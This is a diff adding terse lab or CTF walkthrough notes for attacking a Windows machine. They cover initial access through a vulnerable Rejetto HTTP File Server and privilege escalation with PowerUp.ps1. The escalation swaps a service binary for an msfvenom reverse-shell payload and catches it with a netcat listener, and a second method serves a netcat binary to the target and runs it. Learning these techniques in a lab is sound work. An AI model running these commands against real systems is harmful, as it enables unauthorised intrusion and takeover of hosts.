@@ -1,0 +1,39 @@
+--> another web-server running on port 8080
+
+--> initial access -	(using metasploit) - 
+'rejetto http file server' running --> exploitable using metasploit
+
+--> priv Esc -	(using metasploit) -
+we'll use a script- ** PowerUp.ps1 ** under --> '/root/Desktop/Other Tools/Priv Esc/PEAS/winPEAS/windows/PowerUp.ps1'
+upload this script in meterpreter session -
+	'''
+	upload /root/Desktop/Other Tools/Priv Esc/PEAS/winPEAS/windows/PowerUp.ps1
+	load powershell  -->  (load powershell in meterpreter session)
+	powershell_shell  -->  (running powershell)
+	. .\PowerUp.ps1  -->  (running the script)
+	Invoke-AllChecks
+	'''
+
+services with 'CanRestart' option as True can be restarted, can be vulnerable..
+
+stop the service, 
+upload our msfvenom payload as name of the legitimate file  -->  
+	'''	
+	msfvenom -p windows/shell_reverse_tcp LHOST=<our ip> LPORT=<port> -e x86/shikata_ga_nai -f exe > shell-name.exe
+	'''
+setup netcat listener
+restart the service
+
+
+
+--> access and escalation (without metasploit)-
+1. have a python server hosting compiled netcat binary  -->  python3 -m http.server 80
+2. have a netcat listener running for incomming connections  -->  nc -nlvp <port>
+3. run the elliot.py script  -->  python3 elliot.py <target ip> <target port>
+
+run python script 2 times-
+first time it will tranfer the script in target machine and second time it will run that netcat binary
+
+--> powershell -c "Get-Service"  --> this will get all the services running
+transfer the winPEAS, run it 
+rest same
